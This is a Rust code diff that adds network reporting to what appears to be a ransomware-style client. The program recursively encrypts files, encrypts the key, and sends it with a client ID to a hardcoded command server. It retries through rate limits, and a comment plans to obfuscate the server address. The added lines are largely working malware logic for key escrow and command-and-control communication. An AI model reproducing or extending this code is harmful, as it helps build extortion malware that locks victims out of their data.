@@ -1,8 +1,11 @@
-use comms::generate_ucid;
+use comms::{generate_ucid, Message};
 use filesystem::recurse_directory_with_channel;
 use openssl::ec;
 use std::path::PathBuf;
+use std::thread::sleep;
+use std::time::Duration;
 use std::vec::Vec;
+use tokio::net::TcpSocket;
 
 use zeroize::Zeroize;
 
@@ -10,7 +13,9 @@ mod comms;
 mod encryptor;
 mod filesystem;
 
-const _THREADS: i32 = 8;
+const THREADS: i32 = 8;
+// todo obfuscate this value (encrypt with server private key?)
+const SERVER_IP: &'static str = "127.0.0.1:4200";
 
 #[allow(dead_code)]
 #[cfg(unix)]
@@ -29,7 +34,7 @@ async fn main() {
 
     let mut threads = Vec::new();
 
-    for _ in 0.._THREADS {
+    for _ in 0..THREADS {
         let thread_reciever = r.clone();
         let thread_key = key.clone();
         threads.push(tokio::spawn(async move {
@@ -50,11 +55,72 @@ async fn main() {
     // Encrypt the data and discard its length
     let _ = encryptor.encrypt(&key, &mut encrypted).unwrap();
 
-    let ucid = generate_ucid().unwrap();
+    let mut ucid = generate_ucid().unwrap();
 
-    let register_blob = comms::Message::RegisterClient((ucid, encrypted.as_slice())).to_req();
+    key.zeroize(); // zero out key, not needed anymore
 
-    // send key to server here
+    let mut register_blob = comms::Message::RegisterClient((ucid, encrypted.as_slice())).to_req();
 
-    key.zeroize();
+    let addr = SERVER_IP.parse().unwrap();
+
+    let socket = TcpSocket::new_v4().unwrap();
+    let stream = socket.connect(addr).await.unwrap();
+    let mut read_buff = vec![0; 1024];
+
+    loop {
+        if stream.writable().await.is_ok() {
+            let len = stream.try_write(&register_blob);
+            if len.is_err() {
+                // try immediately, connection appears to be active
+                sleep(Duration::from_millis(1));
+                continue;
+            } else if len.as_ref().is_ok_and(|x| *x == 0) {
+                println!(
+                    "Connection dropped by server. Assumed rate limit, retrying after 30 seconds."
+                );
+                sleep(Duration::from_secs(31));
+                continue;
+            }
+        }
+
+        if stream.readable().await.is_ok() {
+            let len = stream.try_read(&mut read_buff);
+
+            if len.is_err() {
+                // try immediately, connection appears to be active
+                sleep(Duration::from_millis(1));
+                continue;
+            } else if len.as_ref().is_ok_and(|x| *x == 0) {
+                println!(
+                    "Connection dropped by server. Assumed rate limit, retrying after 30 seconds."
+                );
+                sleep(Duration::from_secs(31));
+                continue;
+            }
+
+            let len = len.unwrap(); // len is valid, it's safe to unwrap
+
+            match Message::from_req(&mut read_buff[0..len]) {
+                Message::UcidReject(_) => {
+                    ucid = generate_ucid().unwrap();
+                    register_blob =
+                        comms::Message::RegisterClient((ucid, encrypted.as_slice())).to_req();
+                }
+                Message::RateReject() => {
+                    println!(
+                    "Connection dropped by server. Response was rate limit, retrying after 30 seconds."
+                );
+                    sleep(Duration::from_secs(31));
+                    continue;
+                }
+                Message::Accepted(_) => {
+                    println!("Transmission successful, client exiting...");
+                    break;
+                }
+                _ => {
+                    continue;
+                }
+            }
+        }
+    }
 }
